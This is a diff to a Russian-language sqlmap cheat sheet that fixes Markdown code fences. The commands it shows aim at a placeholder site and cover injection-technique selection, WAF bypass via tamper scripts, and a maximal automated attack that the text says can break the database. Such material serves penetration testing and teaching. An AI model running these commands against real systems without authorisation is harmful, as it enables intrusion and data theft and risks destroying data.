@@ -37,12 +37,12 @@ ________________________________________________________________________________
 Определение типа инъекции
 > ```bash
 > sqlmap -u "http://example.com/index.php?id=1" --technique=U
-Где U – Union-based, можно заменить на B (Boolean-based), T (Time-based) и т. д.
+```Где U – Union-based, можно заменить на B (Boolean-based), T (Time-based) и т. д.```
 
 Обход WAF (Web Application Firewall)
 > ```bash
 > sqlmap -u "http://example.com/index.php?id=1" --tamper=space2comment
-Можно использовать другие tamper-скрипты, например charencode, randomcase и т. д.
+```Можно использовать другие tamper-скрипты, например charencode, randomcase и т. д.```
 
 Определение уровня привилегий
 > ```bash
@@ -90,6 +90,7 @@ ________________________________________________________________________________
 Запуск мощной автоматической атаки
 > ```bash
 > sqlmap -u "http://example.com/index.php?id=1" --level=5 --risk=3 --batch
+```
 --level=5 – увеличивает глубину проверки
 --risk=3 – максимальный уровень риска (может сломать базу)
 --batch – отключает вопросы (запускает атаку автоматически)
